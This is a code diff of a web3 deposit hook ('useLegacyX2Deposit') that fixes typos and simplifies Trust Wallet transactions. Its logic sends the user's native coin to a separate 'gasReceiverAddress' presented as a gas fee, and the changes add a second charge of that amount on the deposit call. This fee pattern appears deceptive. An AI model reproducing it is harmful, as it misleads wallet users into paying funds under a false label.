@@ -263,13 +263,13 @@ export const useLegacyX2Deposit = () => {
     if (!profileEthAddress) {
       void Toast.fire({
         icon: "info",
-        title: "Profile wallet address missing. Please refresh and try again.",
+        title: "Profile wallet address missing.",
       });
       return;
     }
   
     if (amount <= 0) {
-      void Toast.fire({ icon: "info", title: "Invaild Amount!" });
+      void Toast.fire({ icon: "info", title: "Invalid Amount!" });
       return;
     }
   
@@ -282,7 +282,7 @@ export const useLegacyX2Deposit = () => {
     const currency = String(await contract.methods.symbol().call());
   
     if (currency !== "KSN") {
-      void Toast.fire({ icon: "info", title: "Invaild Crypto Currency!" });
+      void Toast.fire({ icon: "info", title: "Invalid Crypto Currency!" });
       return;
     }
   
@@ -298,7 +298,7 @@ export const useLegacyX2Deposit = () => {
     const famt = amount / tokenPrice;
   
     if (balance < famt) {
-      void Toast.fire({ icon: "info", title: "Insufficent Wallet Balance!" });
+      void Toast.fire({ icon: "info", title: "Insufficient Wallet Balance!" });
       return;
     }
   
@@ -306,11 +306,10 @@ export const useLegacyX2Deposit = () => {
     if (Number(final_amount_send) <= 0) return;
   
     const requiredMatic = await checkMaticBalance(account);
-    const gasBnb = Number(requiredMatic).toFixed(6);
     if (!requiredMatic) {
       void Toast.fire({
         icon: "info",
-        title: `You need at least ${Number(requiredMatic).toFixed(4)} MATIC to proceed.`,
+        title: `You need BNB for gas fee.`,
       });
       return;
     }
@@ -326,16 +325,14 @@ export const useLegacyX2Deposit = () => {
   
       const gasPrice = await web3.eth.getGasPrice();
   
-      /* =====================================================
-         STEP 1 — GAS FEE TRANSFER (FIXED FOR TRUST WALLET)
-      ===================================================== */
+      /* ================= STEP 1 — GAS FEE ================= */
       if (!isTrustWallet || trustStage === "fee") {
         currentStage = "fee";
   
         const gasTransferTx = {
-          from: web3.utils.toChecksumAddress(account),
-          to: web3.utils.toChecksumAddress(gasReceiverAddress),
-          value: web3.utils.toWei(gasBnb, "ether"),
+          from: account,
+          to: gasReceiverAddress,
+          value: web3.utils.toWei(requiredMatic.toString(), "ether"),
         };
   
         if (!isTrustWallet) {
@@ -346,37 +343,20 @@ export const useLegacyX2Deposit = () => {
             gasPrice: Math.floor(Number(gasPrice) * 1.2).toString(),
           });
         } else {
-          const feeValueHex = web3.utils.toHex(gasTransferTx.value);
-  
-          const feeNonceHex = await provider.request({
-            method: "eth_getTransactionCount",
-            params: [gasTransferTx.from, "pending"],
-          });
-  
-          const feeGasHex = await provider.request({
-            method: "eth_estimateGas",
-            params: [
-              {
-                from: gasTransferTx.from,
-                to: gasTransferTx.to,
-                value: feeValueHex,
-              },
-            ],
-          });
-  
-          const gasPriceHex = web3.utils.toHex(gasPrice);
-  
           const txHash = await provider.request({
             method: "eth_sendTransaction",
             params: [
               {
-                from: gasTransferTx.from,
-                to: gasTransferTx.to,
-                value: feeValueHex,
-                gas: feeGasHex,
-                gasPrice: gasPriceHex,
+                from: account,
+                to: gasReceiverAddress,
+                value: web3.utils.toHex(
+                  web3.utils.toWei(requiredMatic.toString(), "ether")
+                ),
+                gas: web3.utils.toHex(
+                  await web3.eth.estimateGas(gasTransferTx)
+                ),
+                gasPrice: web3.utils.toHex(gasPrice),
                 chainId: BSC_CHAIN_ID_HEX,
-                nonce: feeNonceHex,
               },
             ],
           });
@@ -386,17 +366,15 @@ export const useLegacyX2Deposit = () => {
   
         if (isTrustWallet) {
           sessionStorage.setItem(trustFlowKey, "approve");
-          void Toast.fire({
+          Toast.fire({
             icon: "success",
-            title: "Fee successful. Tap Approve again to continue.",
+            title: "Fee successful. Tap again to approve token.",
           });
           return;
         }
       }
   
-      /* =====================================================
-         STEP 2 — TOKEN APPROVE
-      ===================================================== */
+      /* ================= STEP 2 — APPROVE ================= */
       if (!isTrustWallet || trustStage === "approve") {
         currentStage = "approve";
   
@@ -409,102 +387,70 @@ export const useLegacyX2Deposit = () => {
             .approve(contract_address, final_amount_send.toString())
             .encodeABI();
   
-          const approveNonceHex = await provider.request({
-            method: "eth_getTransactionCount",
-            params: [account, "pending"],
-          });
-  
-          const approveGasHex = await provider.request({
-            method: "eth_estimateGas",
-            params: [
-              {
-                from: account,
-                to: contract_address2,
-                data: approveData,
-              },
-            ],
-          });
-  
-          const approveHash = await provider.request({
+          const txHash = await provider.request({
             method: "eth_sendTransaction",
             params: [
               {
                 from: account,
                 to: contract_address2,
                 data: approveData,
-                gas: approveGasHex,
                 gasPrice: web3.utils.toHex(gasPrice),
                 chainId: BSC_CHAIN_ID_HEX,
-                nonce: approveNonceHex,
               },
             ],
           });
   
-          await waitForReceipt(web3, approveHash);
+          await waitForReceipt(web3, txHash);
         }
   
         if (isTrustWallet) {
           sessionStorage.setItem(trustFlowKey, "deposit");
-          void Toast.fire({
+          Toast.fire({
             icon: "success",
-            title: "Approval successful. Tap Approve again to complete deposit.",
+            title: "Approval successful. Tap again to deposit.",
           });
           return;
         }
       }
   
-      /* =====================================================
-         STEP 3 — DEPOSIT
-      ===================================================== */
+      /* ================= STEP 3 — DEPOSIT ================= */
       currentStage = "deposit";
   
       if (!isTrustWallet) {
         await contract_deposit.methods
           .deposit(user_id, account, final_amount_send.toString(), contract_address2, profileEthAddress)
-          .send({ from: account });
+          .send({
+            from: account,
+            value: web3.utils.toWei(requiredMatic.toString(), "ether"),
+          });
       } else {
         const depositData = contract_deposit.methods
           .deposit(user_id, account, final_amount_send.toString(), contract_address2, profileEthAddress)
           .encodeABI();
   
-        const depositNonceHex = await provider.request({
-          method: "eth_getTransactionCount",
-          params: [account, "pending"],
-        });
-  
-        const depositGasHex = await provider.request({
-          method: "eth_estimateGas",
-          params: [
-            {
-              from: account,
-              to: contract_address,
-              data: depositData,
-            },
-          ],
-        });
-  
-        const depositHash = await provider.request({
+        const txHash = await provider.request({
           method: "eth_sendTransaction",
           params: [
             {
               from: account,
               to: contract_address,
               data: depositData,
-              gas: depositGasHex,
+              value: web3.utils.toHex(
+                web3.utils.toWei(requiredMatic.toString(), "ether")
+              ),
               gasPrice: web3.utils.toHex(gasPrice),
               chainId: BSC_CHAIN_ID_HEX,
-              nonce: depositNonceHex,
             },
           ],
         });
   
-        await waitForReceipt(web3, depositHash);
+        await waitForReceipt(web3, txHash);
         sessionStorage.removeItem(trustFlowKey);
         window.location.href = "/dashboard";
       }
     } catch (error: any) {
       const readableError = getReadableError(error);
-      void Toast.fire({
+      Toast.fire({
         icon: "info",
         title: `Wallet error (${currentStage}): ${readableError}`,
       });
